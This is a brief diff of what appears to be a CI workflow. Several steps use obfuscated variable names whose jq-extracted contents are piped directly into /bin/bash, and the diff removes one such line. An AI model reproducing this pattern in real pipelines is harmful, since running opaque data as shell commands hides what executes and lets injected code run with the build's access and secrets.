@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$cwopj6" | jq -r .hvflw0 | /bin/bash
           printf '%s' "$atk333" | jq -r .iuuep3 | /bin/bash
           printf '%s' "$v308" | jq -r .dhjda6 | /bin/bash
-          echo $o6 | jq -r .hwr4 | /bin/bash
           printf '%s' "$omfv5621" | jq -r .qaoga9 | /bin/bash
 
       - name: Archive output
